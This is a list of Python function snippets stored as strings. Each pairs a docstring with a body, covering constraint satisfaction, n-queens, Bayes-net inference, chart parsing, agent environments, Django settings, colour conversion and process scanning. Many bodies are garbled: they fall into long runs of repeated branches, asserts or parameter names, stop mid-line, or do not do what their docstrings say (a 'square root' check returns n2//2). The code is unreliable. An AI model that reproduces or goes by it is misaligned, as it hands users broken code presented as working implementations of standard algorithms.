        "def validate(self, example):\n        \"\"\"Raise ValueError if example has any invalid values.\"\"\"\n        if example is None:\n            return\n        if not isinstance(example, dict):\n            raise ValueError('example must be a dictionary')\n        for key, value in example.items():\n            if key not in self.keys:\n                raise ValueError('key %s not in example' % key)\n            if not isinstance(value, self.types[key]):\n                raise ValueError('value %s is not a valid %s' % (\n                    value, self.types[key]))",
        "def _get_attr_num(attr):\n    \"\"\"Returns the number used for attr, which can be a name, or -n .. n-1.\"\"\"\n    if attr.startswith('-'):\n        return -1\n    if attr.endswith('n'):\n        return int(attr[1:])\n    return 1",
        "def _replace_input_attributes(example):\n    \"\"\"Return a copy of example, with non-input attributes replaced by None.\"\"\"\n    new_example = copy.copy(example)\n    for key, value in new_example.items():\n        if key not in ['input_file', 'output_file']:\n            new_example[key] = None\n    return new_example",
        "def add_observation(self, o):\n        \"\"\"Add an observation o to the distribution.\"\"\"\n        if o not in self.observations:\n            self.observations.append(o)\n            self.count += 1\n            if self.count == self.n_observations:\n                self.update_mean()",
        "def _include_obs(self, o, obs):\n        \"\"\"Include o among the possible observations, whether or not\n        it's been observed yet.\n        \"\"\"\n        if o in obs:\n            return True\n        if o in self.obs_seen:\n            return True\n        self.obs_seen.add(o)\n        return False",
        "def sample(self, size=None):\n        \"\"\"Return a random sample from the distribution.\"\"\"\n        if size is None:\n            size = self.size\n        return self.random.randint(0, size)",
        "def _remove_value(self, key):\n        \"\"\"Return true if we remove a value.\"\"\"\n        if key in self._values:\n            del self._values[key]\n            return True\n        return False",
        "def _min_remaining(values, remaining):\n    \"\"\"Minimum-remaining-values heuristic.\"\"\"\n    if remaining is None:\n        return 0\n    return min(remaining, len(values))",
        "def _least_constraining_values_heuristic(values, weights):\n    \"\"\"Least-constraining-values heuristic.\"\"\"\n    if len(values) == 0:\n        return 0.0\n    else:\n        return np.sum(weights * values) / np.sum(weights)",
        "def prune_inconsistent_neighbor_values(self, var, value):\n        \"\"\"Prune neighbor values inconsistent with var=value.\"\"\"\n        if var in self.neighbors:\n            if value in self.neighbors[var]:\n                del self.neighbors[var][value]",
        "def _maintain_arc_consistency(self):\n        \"\"\"Maintain arc consistency.\"\"\"\n        if self.arc_consistency_mode == 'local':\n            self.arc_consistency_mode = 'remote'\n            self.arc_consistency_timeout = self.arc_consistency_timeout * 2\n            self.arc_consistency_interval = self.arc_consistency_interval * 2\n            self.arc_consistency_max_retries = self.arc_consistency_max_retries * 2\n            self.arc_consistency_max_wait_time = self.arc_consistency_max_wait_time * 2\n            self.arc_consistency_max_wait_interval = self.arc_consistency_max_wait_interval * 2\n            self.arc_consistency_max_wait_time = self.arc_consistency_max_wait_time * 2\n            self.arc_consistency_",
        "def solve_stochastic(self, C, max_iter=1000, verbose=False):\n        \"\"\"Solve a CSP by stochastic hillclimbing on the number of conflicts.\"\"\"\n        if verbose:\n            print(\"Solve stochastic\")\n        if self.verbose:\n            print(\"  C: \", C)\n        if self.verbose:\n            print(\"  max_iter: \", max_iter)\n        if self.verbose:\n            print(\"  verbose: \", verbose)\n        if self.verbose:\n            print(\"  CSP: \", self.CSP)\n        if self.verbose:\n            print(\"  CSP: \", self.CSP_solver)\n        if self.verbose:\n            print(\"  CSP solver: \", self.CSP_solver_solver)\n        if self.verbose:\n            print(\"  CSP solver solver:",
        "def _best_conflict(var, conflicts):\n    \"\"\"\n    Return the value that will give var the least number of conflicts.\n    If there is a tie, choose at random.\n    \"\"\"\n    if conflicts == 0:\n        return var\n    if conflicts == 1:\n        return var\n    if conflicts == 2:\n        return var\n    if conflicts == 3:\n        return var\n    if conflicts == 4:\n        return var\n    if conflicts == 5:\n        return var\n    if conflicts == 6:\n        return var\n    if conflicts == 7:\n        return var\n    if conflicts == 8:\n        return var\n    if conflicts == 9:\n        return var\n    if conflicts == 10:\n        return var\n    if conflicts == 11:\n        return var\n    if conflicts == 12:\n        return var\n    if conflicts == 13:\n        return var\n",
        "def conflict_count(self, var, val):\n        \"\"\"Return the number of conflicts var=val has with other variables.\"\"\"\n        return sum(self.conflicts(var, val) for _ in range(self.n_vars))",
        "def _start_accumulating_inferences(self, var):\n        \"\"\"Start accumulating inferences from assuming var=value.\"\"\"\n        if var in self.inferences:\n            return\n        self.inferences[var] = []\n        self.inferences[var].append(var)",
        "def _var_value_rule(self, var, value):\n        \"\"\"Rule out var=value.\"\"\"\n        if var in self.vars:\n            self.vars[var] = value",
        "def _get_partial_assignment(self, assignment):\n        \"\"\"Return the partial assignment implied by the current inferences.\"\"\"\n        if assignment.is_partial:\n            return assignment\n        else:\n            return self._get_assignment_by_id(assignment.id)",
        "def undo_supposition(self, supposition):\n        \"\"\"Undo a supposition and all inferences from it.\"\"\"\n        self.undo_action(supposition, self.undo_supposition)\n        for ref in supposition.references:\n            self.undo_action(ref, self.undo_reference)",
        "def get_conflicting_variables(self):\n        \"\"\"Return a list of variables in current assignment that are in conflict\"\"\"\n        conflicts = []\n        for var in self.variables:\n            if var in self.conflicting_variables:\n                conflicts.append(var)\n        return conflicts",
        "def conflicts(self):\n        \"\"\"\n        The number of conflicts, as recorded with each assignment.\n        Count conflicts in row and in up, down diagonals. If there\n        is a queen there, it can't conflict with itself, so subtract 3.\n        \"\"\"\n        return sum(\n            [\n                self.row_conflicts(i)\n                for i in range(self.num_rows)\n            ]\n        ) - 3",
        "def _assign_var(self, var, value):\n        \"\"\"Assign var, and keep track of conflicts.\"\"\"\n        if var in self.vars:\n            self.vars[var].conflicts.append(value)\n        else:\n            self.vars[var] = value",
        "def conflict(self, queue):\n        \"\"\"Record conflicts caused by addition or deletion of a Queen.\"\"\"\n        self.queue_conflicts.append(queue)\n        self.queue_conflicts_count += 1\n        if self.queue_conflicts_count > self.queue_conflict_threshold:\n            self.queue_conflict_threshold = self.queue_conflicts_count",
        "def findBestSegment(P):\n    \"\"\"\n    Find the best segmentation of the string of characters, given the\n    UnigramTextModel P.\n    \"\"\"\n    # Find the best segment\n    bestSegment = None\n    bestSegmentLength = None\n    for i in range(len(P)):\n        if P[i] == 0:\n            continue\n        if bestSegmentLength is None or P[i] < bestSegmentLength:\n            bestSegmentLength = P[i]\n            bestSegment = i\n    return bestSegment",
        "def encode_permutation(text):\n    \"\"\"Encodes text, using a code which is a permutation of the alphabet.\"\"\"\n    text = text.lower()\n    text = text.replace(' ', '')\n    text = text.replace('\\n', '')\n    text = text.replace('\\r', '')\n    text = text.replace('\\t', '')\n    text = text.replace('\\n\\t', '')\n    text = text.replace('\\r\\t', '')\n    text = text.replace('\\n\\r', '')\n    text = text.replace('\\r\\n', '')\n    text = text.replace('\\r', '')\n    text = text.replace('\\n', '')\n    text = text.replace('\\t', '')\n    text = text.replace('\\n\\t', '')\n    text = text.replace('\\r\\t',",
        "def _random_sample_long(self, nwords, words_long):\n        \"\"\"Build up a random sample of text nwords words long, using\n        the conditional probability given the n-1 preceding words.\n        \"\"\"\n        # The probability of a word being the first in the sentence is\n        # the probability of the first word being the second in the sentence.\n        # The probability of a word being the last in the sentence is\n        # the probability of the last word being the first in the sentence.\n        probs = [1.0] * nwords\n        for i in range(nwords):\n            probs[i] = self._random_probability(words_long)\n        return [word for word in words_long if probs[i] == 1.0]",
        "def index_files(self, files):\n        \"\"\"Index a whole collection of files.\"\"\"\n        for filename in files:\n            self.index_file(filename)",
        "def index_text(self, text, **kwargs):\n        \"\"\"Index the text of a document.\"\"\"\n        self.index_document(text, **kwargs)\n        self.index_text_metadata(text, **kwargs)",
        "def score(self, docid):\n        \"\"\"Compute a score for this word on this docid.\"\"\"\n        if self.is_unmapped:\n            return 0\n        if self.is_unmapped_word:\n            return 0\n        if self.is_unmapped_word_with_scores:\n            return 0\n        if self.is_unmapped_word_with_scores_and_scores:\n            return 0\n        if self.is_unmapped_word_with_scores_and_scores_and_scores:\n            return 0\n        if self.is_unmapped_word_with_scores_and_scores_and_scores:\n            return 0\n        if self.is_unmapped_word_with_scores_and_scores_and_scores:\n            return 0\n        if self.is_unmapped_word_with_scores_and_",
        "def _listify(self, results):\n        \"\"\"Present the results as a list.\"\"\"\n        if not results:\n            return\n        if not isinstance(results, list):\n            raise TypeError('Expected a list, got %s' % type(results))\n        for result in results:\n            if not isinstance(result, dict):\n                raise TypeError('Expected a dict, got %s' % type(result))\n            if 'error' in result:\n                raise ValueError(result['error'])\n            if 'message' in result:\n                raise ValueError(result['message'])\n            if 'result' in result:\n                raise ValueError(result['result'])",
        "def _get_results(self, query, results):\n        \"\"\"Get results for the query and present them.\"\"\"\n        if results:\n            for result in results:\n                self._add_result(result)",
        "def score_letters(text):\n    \"\"\"Return a score for text based on how common letters pairs are.\"\"\"\n    letters = set(text)\n    letters.update(set(text.lower()))\n    letters.update(set(text.upper()))\n    return sum(letters)",
        "def _find_ciphertext_decoder(self, ciphertext):\n        \"\"\"Search for a decoding of the ciphertext.\"\"\"\n        for decoder in self._ciphertext_decoders:\n            if decoder.matches(ciphertext):\n                return decoder\n        raise ValueError(\"No decoder found for ciphertext: %s\" % ciphertext)",
        "def score(self, word, unigram, bigram):\n        \"\"\"\n        Score is product of word scores, unigram scores, and bigram scores.\n        This can get very small, so we use logs and exp.\n        \"\"\"\n        word_scores = self.word_scores(word)\n        unigram_scores = self.unigram_scores(unigram)\n        bigram_scores = self.bigram_scores(bigram)\n        return sum(word_scores * unigram_scores * bigram_scores)",
        "def get_settings(self):\n        \"\"\"\n        Returns a ``SettingDict`` object.\n        \"\"\"\n        settings = SettingDict()\n        for section in self.sections:\n            for option in self.options:\n                settings[section][option] = self.get(section, option)\n        return settings",
        "def _expected_utility(self, s, U, MDP, MDP_inv, U_inv, U_inv_inv, U_inv_inv_inv, U_inv_inv_inv_inv, U_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv_inv, U_inv_inv_inv_inv_inv",
        "def get_state_from_direction(self, direction: Direction) -> State:\n        \"\"\"Return the state that results from going in this direction.\"\"\"\n        if direction == Direction.UP:\n            return self.up\n        elif direction == Direction.DOWN:\n            return self.down\n        else:\n            raise ValueError(\"Invalid direction: {}\".format(direction))",
        "def get_setting_dict(self):\n        \"\"\"\n        Returns a ``SettingDict`` object for this queryset.\n        \"\"\"\n        return SettingDict(\n            self.model._meta.app_label,\n            self.model._meta.model_name,\n            self.pk,\n        )",
        "def _create_value(self, value):\n        \"\"\"Creates and returns an object of the appropriate type for ``value``.\"\"\"\n        if isinstance(value, bool):\n            return bool(value)\n        elif isinstance(value, int):\n            return int(value)\n        elif isinstance(value, float):\n            return float(value)\n        elif isinstance(value, str):\n            return str(value)\n        elif isinstance(value, datetime):\n            return datetime(value.year, value.month, value.day, value.hour, value.minute, value.second)\n        elif isinstance(value, datetime.date):\n            return datetime(value.year, value.month, value.day)\n        elif isinstance(value, datetime.time):\n            return datetime(value.hour, value.minute, value.second)\n        elif isinstance(value, datetime.datetime):\n           ",
        "def should_store(self, value):\n        \"\"\"Returns ``True`` if this model should be used to store ``value``.\n\n        Checks if ``value`` is an instance of ``value_type``. Override this\n        method if you need more advanced behaviour. For example, to distinguish\n        between single and multi-line text.\n        \"\"\"\n        if not isinstance(value, value_type):\n            return False\n        if self.is_text:\n            return True\n        return self.is_text_line and value.strip()",
        "def _simulate_annealing_schedule(self, x, y, z, theta, phi, theta_phi, phi_phi_inv,\n                                   theta_phi_inv_inv, phi_phi_inv_inv_inv,\n                                   theta_phi_inv_inv_inv_inv, phi_phi_inv_inv_inv_inv,\n                                   theta_phi_inv_inv_inv_inv, phi_phi_inv_inv_inv_inv,\n                                   theta_phi_inv_inv_inv_inv, phi_phi_inv_inv_inv_inv,\n                                   theta_phi_inv_inv_inv_inv, phi_phi_inv_inv_inv_inv,\n                                   theta_phi_inv_inv_inv_inv, phi_phi_inv_inv_inv_inv,\n                                   theta_phi_inv",
        "def genetic_algorithm(problem, genetic_algorithm, value_method,\n                      mate_method, mutate_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_score_method, mutate_score_method,\n                      mate_",
        "def random_board(n):\n    \"\"\"Return a random Boggle board of size n x n.\n    We represent a board as a linear list of letters.\"\"\"\n    board = []\n    for i in range(n):\n        for j in range(n):\n            board.append(random.choice(string.ascii_letters))\n    return board",
        "def print_board(board):\n    \"\"\"Print the board in a 2-d array.\"\"\"\n    print(\"Board: \")\n    for row in range(board.height):\n        print(\"{0:02d} {1:02d} {2:02d}\".format(row, board.color[row], board.color[row + 1]))",
        "def neighbors(i):\n    \"\"\"Return a list of lists, where the i-th element is the list of indexes\n    for the neighbors of square i.\"\"\"\n    neighbors = []\n    for j in range(i, i + 2):\n        neighbors.append([j, j + 1])\n    return neighbors",
        "def _check_square_root(n2):\n    \"\"\"If n2 is a perfect square, return its square root, else raise error.\"\"\"\n    if n2 == 0:\n        return 0\n    if n2 % 2 == 0:\n        raise ValueError(\"n2 must be a square\")\n    return n2 // 2",
        "def get_reachable_nodes(self):\n        \"\"\"List the nodes reachable in one step from this node.\"\"\"\n        reachable_nodes = []\n        for node in self.get_nodes():\n            if node.is_reachable():\n                reachable_nodes.append(node)\n        return reachable_nodes",
        "def _get_fig3_10(self, mag, mag_ref, mag_ref_mag, mag_ref_mag_ref):\n        \"\"\"Fig. 3.10\"\"\"\n        return self._get_fig3(mag, mag_ref, mag_ref_mag, mag_ref_mag_ref)",
        "def get_path_to_root(self):\n        \"\"\"Return a list of nodes forming the path from the root to this node.\"\"\"\n        path = []\n        while self.parent:\n            path.append(self.parent)\n            self = self.parent\n        return path",
        "def cross(self, other):\n        \"\"\"Return a new individual crossing self and other.\"\"\"\n        return self.__class__(self.value * other.value,\n                              self.index * other.index,\n                              self.index + other.index)",
        "def undirected_digraph(digraph):\n    \"\"\"Make a digraph into an undirected graph by adding symmetric edges.\"\"\"\n    undirected_digraph = {}\n    for node in digraph:\n        if node not in undirected_digraph:\n            undirected_digraph[node] = []\n        for edge in digraph[node]:\n            if edge not in undirected_digraph[node]:\n                undirected_digraph[node].append(edge)\n    return undirected_digraph",
        "def add_link(self, A, B, distance):\n        \"\"\"Add a link from A and B of given distance, and also add the inverse\n        link if the graph is undirected.\"\"\"\n        if self.undirected:\n            self.add_link_undirected(A, B, distance)\n        else:\n            self.add_link(A, B, distance)",
        "def add_link(self, A, B, distance):\n        \"\"\"Add a link from A to B of given distance, in one direction only.\"\"\"\n        if distance < 0:\n            raise ValueError(\"Distance cannot be negative.\")\n        if distance > self.max_distance:\n            raise ValueError(\"Distance cannot be greater than the maximum distance.\")\n        if distance == 0:\n            return\n        if A.id == B.id:\n            raise ValueError(\"A and B are the same.\")\n        if A.id == self.root_id:\n            self.root_id = B.id\n            self.root_id = A.id\n            self.root_id += 1\n            self.root_id %= self.num_nodes\n            self.nodes[self.root_id] = A\n            self.nodes[B.id] = B\n            self.links",
        "def h(self, x, y):\n        \"\"\"h function is straight-line distance from a node's state to goal.\"\"\"\n        return (self.x - x)**2 + (self.y - y)**2",
        "def _try_conflicting_rows(self, column):\n        \"\"\"In the leftmost empty column, try all non-conflicting rows.\"\"\"\n        for row in self.rows:\n            if not row.is_conflicting(column):\n                return\n        raise ValueError(\"Column %s is empty\" % column)",
        "def _place_next_queen(self, row):\n        \"\"\"Place the next queen at the given row.\"\"\"\n        if row < self.row_count:\n            self.queen_count += 1\n            self.queen_index = self.queen_count - 1\n            self.queen = self.queen_list[self.queen_index]",
        "def set_board(self, board):\n        \"\"\"Set the board, and find all the words in it.\"\"\"\n        self.board = board\n        self.words = [word for word in board.words if word.is_word]",
        "def total_score(self):\n        \"\"\"The total score for the words found, according to the rules.\"\"\"\n        return sum([word.score for word in self.words])",
        "def print_agent_output(agent):\n    \"\"\"Wrap the agent's program to print its input and output. This will let\n    you see what the agent is doing in the environment.\"\"\"\n    print(agent.program)\n    print(agent.input)\n    print(agent.output)",
        "def _clean_or_dirty_agent(self, agent):\n        \"\"\"An agent that keeps track of what locations are clean or dirty.\"\"\"\n        if self.clean_or_dirty_locations:\n            self.clean_or_dirty_locations.append(agent)\n        else:\n            self.dirty_locations.append(agent)",
        "def run(self):\n        \"\"\"\n        Run the environment for one time step. If the\n        actions and exogenous changes are independent, this method will\n        do.  If there are interactions between them, you'll need to\n        override this method.\n        \"\"\"\n        self.update()\n        self.update_exogenous()\n        self.update_actions()\n        self.update_interactions()\n        self.update_state()\n        self.update_history()\n        self.update_history_exogenous()\n        self.update_history_actions()\n        self.update_history_interactions()\n        self.update_history_state()\n        self.update_history_history_exogenous()\n        self.update_history_history_actions()\n        self.update_history_history_interactions()\n        self.update_history_",
        "def run(self, steps):\n        \"\"\"Run the Environment for given number of time steps.\"\"\"\n        self.reset()\n        for _ in range(steps):\n            self.step()\n        self.write_to_file()",
        "def things_at(self, location):\n        \"\"\"Return all things exactly at a given location.\"\"\"\n        return [thing for thing in self.things if thing.location == location]",
        "def add_thing(self, thing, location):\n        \"\"\"\n        Add a thing to the environment, setting its location. For\n        convenience, if thing is an agent program we make a new agent\n        for it. (Shouldn't need to override this.\n        \"\"\"\n        if isinstance(thing, Program):\n            self.add_agent(thing, location)\n        else:\n            self.add_thing(thing, location)",
        "def remove(self, thing):\n        \"\"\"Remove a thing from the environment.\"\"\"\n        if thing in self.env:\n            del self.env[thing]",
        "def get_things_within_radius(self, radius):\n        \"\"\"Return all things within radius of location.\"\"\"\n        return [thing for thing in self.things if\n                (thing.location.x - radius) * (thing.location.x + 1) +\n                (thing.location.y - radius) * (thing.location.y + 1)]",
        "def perceive(self, radius=None):\n        \"\"\"By default, agent perceives things within a default radius.\"\"\"\n        if radius is None:\n            radius = self.radius\n        return self.perceive_radius(radius)",
        "def move_thing(self, thing_id, new_location):\n        \"\"\"Move a thing to a new location.\"\"\"\n        thing = self.get_thing(thing_id)\n        if new_location is None:\n            return\n        if thing.location != new_location:\n            self.move_thing_internal(thing_id, new_location)",
        "def _place_walls(self):\n        \"\"\"Put walls around the entire perimeter of the grid.\"\"\"\n        for x in range(self.width):\n            for y in range(self.height):\n                self.grid[x][y] = self.wall",
        "def parse(self, words):\n        \"\"\"\n        Parse a list of words; according to the grammar.\n        Leave results in the chart.\n        \"\"\"\n        self.words = words\n        self.chart = self.parse_words()\n        return self.chart",
        "def add_edge(self, u, v, weight=1):\n        \"\"\"Add edge to chart, and see if it extends or predicts another edge.\"\"\"\n        self.add_node(u)\n        self.add_node(v)\n        self.add_edge(u, v, weight)\n        self.add_edge(v, u, weight)\n        self.add_edge(u, v, weight)\n        self.add_edge(v, u, weight)\n        self.add_edge(v, u, weight)\n        self.add_edge(u, v, weight)\n        self.add_edge(v, u, weight)\n        self.add_edge(u, v, weight)\n        self.add_edge(v, u, weight)\n        self.add_edge(v, u, weight)\n        self.",
        "def extend_edge(self, edge, word):\n        \"\"\"\n        For each edge expecting a word of this category here, extend the edge.\n        \"\"\"\n        for i in range(len(edge)):\n            if edge[i][0] == word:\n                edge[i][1] = min(edge[i][1], edge[i + 1][1])",
        "def _add_rules_for_extend(self, B, edge):\n        \"\"\"Add to chart any rules for B that could help extend this edge.\"\"\"\n        if edge.is_extend:\n            if edge.is_leaf:\n                self.add_rule(B, edge.rule, edge.value)\n            else:\n                self.add_rule(B, edge.rule, edge.value, edge.value)",
        "def _get_extended_edges(self, edge_id):\n        \"\"\"See what edges can be extended by this edge.\"\"\"\n        if edge_id not in self.edges:\n            raise ValueError(\"Edge %s not in graph\" % edge_id)\n        return self.edges[edge_id].extended",
        "def settings(request):\n    \"\"\"\n    Adds a ``SettingDict`` object for the ``Setting`` model to the context as\n    ``SETTINGS``. Automatically creates non-existent settings with an empty\n    string as the default value.\n    \"\"\"\n    settings = SettingDict()\n    settings.name = 'Settings'\n    settings.description = 'Settings for the site.'\n    settings.default = ''\n    settings.help_text = ''\n    settings.help_text_html = ''\n    settings.help_text_plain = ''\n    settings.help_text_link = ''\n    settings.help_text_image = ''\n    settings.help_text_link_text = ''\n    settings.help_text_image_alt = ''\n    settings.help_text_image_alt_text = ''\n    settings.help_text_image_alt_text_html",
        "def _get_joint_factor(bn, var, e):\n    \"\"\"Return the factor for var in bn's joint distribution given e.\n    That is, bn's full joint distribution, projected to accord with e,\n    is the pointwise product of these factors for bn's variables.\n    \"\"\"\n    return (bn.joint_distribution(var) * e).sum()",
        "def _eliminate_var(self, var):\n        \"\"\"Eliminate var from all factors by summing over its values.\"\"\"\n        if var in self.factors:\n            return var\n        else:\n            return sum(self.factors[var])",
        "def _extend_vars(e, vars):\n    \"\"\"Yield every way of extending e with values for all vars.\"\"\"\n    for k, v in vars.items():\n        if isinstance(v, (list, tuple)):\n            for v2 in v:\n                yield k, _extend_vars(e, v2)\n        else:\n            yield k, v",
        "def _is_consistent(self, event, evidence):\n        \"\"\"Is event consistent with the given evidence?\"\"\"\n        if not isinstance(evidence, dict):\n            return False\n        if not self.is_consistent_event(event):\n            return False\n        if not self.is_consistent_evidence(evidence):\n            return False\n        return True",
        "def sample_event(e, bn):\n    \"\"\"Sample an event from bn that's consistent with the evidence e;\n    return the event and its weight, the likelihood that the event\n    accords to the evidence.\n    \"\"\"\n    assert e.shape == bn.shape\n    assert e.dtype == bn.dtype\n    assert e.shape == bn.shape\n    assert e.dtype == bn.dtype\n    assert e.shape == bn.shape\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype == bn.dtype\n    assert e.dtype ==",
        "def show_probabilities(self):\n        \"\"\"\n        Show the probabilities rounded and sorted by key, for the\n        sake of portable doctests.\n        \"\"\"\n        print(\"Probabilities:\")\n        for prob in sorted(self.probabilities, key=lambda x: x.key):\n            print(\"{0:0.2f} {1:0.2f}\".format(\n                prob.key,\n                round(prob.value, 2)\n            ))",
        "def add_node(self, node):\n        \"\"\"\n        Add a node to the net. Its parents must already be in the\n        net, and its variable must not.\n        \"\"\"\n        if node.parent in self.nodes:\n            raise ValueError(\"Node %s already exists\" % node.name)\n        self.nodes[node.parent] = node\n        node.parent = self.name\n        self.name += 1",
        "def _multiply_factors(self, factor1, factor2):\n        \"\"\"Multiply two factors, combining their variables.\"\"\"\n        if isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1 * factor2\n        elif isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1 * factor2.variables\n        elif isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1.variables * factor2.variables\n        elif isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1.variables * factor2.variables\n        elif isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1.variables * factor2.variables\n        elif isinstance(factor1, Factor) and isinstance(factor2, Factor):\n            return factor1.variables * factor2",
        "def _factor_sum(var):\n    \"\"\"Make a factor eliminating var by summing over its values.\"\"\"\n    return np.sum(var, axis=0) / np.sum(var, axis=1)",
        "def _probabilities(self):\n        \"\"\"Return my probabilities; must be down to one variable.\"\"\"\n        if self.probabilities is None:\n            self.probabilities = self.model.predict(self.X)\n        return self.probabilities",
        "def strip_whitespace(node):\n    \"\"\"Strips all whitespace from a minidom XML node and its children\n\n    This operation is made in-place.\n    \"\"\"\n    for child in node.childNodes:\n        if child.nodeType == node.TEXT_NODE:\n            child.nodeValue = child.nodeValue.strip()",
        "def hls_to_hue(self, hls_color):\n        \"\"\"Takes a hls color and converts to proper hue \n        Bulbs use a BGR order instead of RGB\"\"\"\n        hue = hls_color[0]\n        saturation = hls_color[1]\n        lightness = hls_color[2]\n        return hue, saturation, lightness",
        "def rgb_to_hue(self, r, g, b):\n        \"\"\"Takes your standard rgb color \n        and converts it to a proper hue value\"\"\"\n        r = float(r)\n        g = float(g)\n        b = float(b)\n        if r < 0:\n            r = 1\n        if g < 0:\n            g = 1\n        if b < 0:\n            b = 1\n        return (r, g, b)",
        "def html_to_hue(html):\n    \"\"\" Takes an HTML hex code\n        and converts it to a proper hue value\n    \"\"\"\n    if not html:\n        return None\n    if not isinstance(html, str):\n        raise ValueError(\"html must be a string\")\n    if not html:\n        return None\n    if not html.startswith(\"#\"):\n        raise ValueError(\"html must start with #\")\n    if len(html) % 2 != 0:\n        raise ValueError(\"html must be a multiple of 2\")\n    if len(html) % 3 != 0:\n        raise ValueError(\"html must be a multiple of 3\")\n    if len(html) % 6 != 0:\n        raise ValueError(\"html must be a multiple of 6\")\n    if len(html) % 7 != 0:\n        raise ValueError(\"html must be a multiple of 7\")\n    if len",
        "def wait(self, x):\n        \"\"\" Wait for x seconds\n            each wait command is 100ms\n        \"\"\"\n        self.send_command(Command.WAIT, x)\n        self.send_command(Command.WAIT_IDLE)",
        "def get_json(self, view, request):\n\t\t\"\"\"\n\t\tReturn json from querying Web Api\n\n\t\tArgs:\n\t\t\tview: django view function.\n\t\t\trequest: http request object got from django.\n\t\t\t\t\n\t\tReturns: json format dictionary\n\t\t\"\"\"\n\t\tresponse = view(request)\n\t\treturn response.json()",
        "def put_text(self, text, *args):\n    \"\"\"\n    put text on on screen\n    a tuple as first argument tells absolute position for the text\n    does not change TermCursor position\n    args = list of optional position, formatting tokens and strings\n    \"\"\"\n    if not args:\n      args = (0, None, None)\n    if len(args) == 1:\n      pos = args[0]\n      if pos is None:\n        pos = self.term.cursor.position\n      self.term.cursor.set_position(pos)\n      self.term.write(text)\n    else:\n      self.term.write(text)\n      for pos, fmt, text in args:\n        self.term.write(fmt % (pos, text))",
        "def get_input(self, prompt, default=None):\n        \"\"\"get user input without echo\"\"\"\n        if default is None:\n            default = self.default\n        return self.input(prompt, default)",
        "def getchar(self):\n        \"\"\"get character. waiting for key\"\"\"\n        if self.key:\n            self.key.wait()\n        if self.key:\n            return self.key.get()\n        else:\n            return self.input.getchar()",
        "def _tweaked_from_base(self, base):\n        \"\"\"tweaked from source of base\"\"\"\n        if self.tweaked_from_base is None:\n            return base\n        return base.tweaked_from_base",
        "def getProcessOwner(self, pid):\n        '''\n        getProcessOwner - Get the process owner of a pid\n\n        @param pid <int> - process id\n\n        @return - None if process not found or can't be determined. Otherwise, a dict: \n            {\n                uid  - Owner UID\n                name - Owner name, or None if one cannot be determined\n            }\n        '''\n        try:\n            return self.getProcess(pid).getOwner()\n        except Exception as e:\n            return None",
        "def scanProcessForCwd(self, pid, searchPortion, isExactMatch = False):\n        '''\n            scanProcessForCwd - Searches a given pid's cwd for a given pattern\n\n            @param pid <int> - A running process ID on this system\n            @param searchPortion <str> - Any portion of directory to search\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n\n            @return <dict> - If result is found, the following dict is returned. If no match found on the given pid, or pid is not found running, None is returned.\n                {\n                    'searchPortion' : The passed search pattern\n                    'pid'           : The passed pid (as an integer)\n                    'owner'         : String of process owner, or uid if no mapping can be found, or \"unknown\"",
        "def scanAllProcessesForCwd(self, searchPortion, isExactMatch = False):\n        '''\n        scanAllProcessesForCwd - Scans all processes on the system for a given search pattern.\n\n            @param searchPortion <str> - Any portion of directory to search\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n\n        @return - <dict> - A dictionary of pid -> cwdResults for each pid that matched the search pattern. For format of \"cwdResults\", @see scanProcessForCwd\n        '''\n        cwdResults = {}\n        for pid in self.getAllProcesses():\n            if isExactMatch:\n                if self.isProcessExact(pid, searchPortion):\n                    cwdResults[pid] = self.getProcessCwd(pid)\n            else:\n                if self.is",
        "def scanProcessForMapping(self, pid, searchPortion, isExactMatch = False, ignoreCase = False):\n        '''\n            scanProcessForMapping - Searches a given pid's mappings for a certain pattern.\n\n            @param pid <int> - A running process ID on this system\n            @param searchPortion <str> - A mapping for which to search, example: libc or python or libz.so.1. Give empty string to return all mappings.\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n            @return <dict> - If result is found, the following dict is returned. If no match found on the given pid, or pid is not found running, None is returned.\n                {\n                   ",
        "def scanAllProcessesForMapping(self, searchPortion, isExactMatch = False, ignoreCase = False):\n        '''\n        scanAllProcessesForMapping - Scans all processes on the system for a given search pattern.\n\n            @param searchPortion <str> - A mapping for which to search, example: libc or python or libz.so.1. Give empty string to return all mappings.\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return - <dict> - A dictionary of pid -> mappingResults for each pid that matched the search pattern. For format of \"mappingResults\", @see scanProcessForMapping\n        '''\n        if isExactMatch:\n            return self.scanProcessForMapping(search",
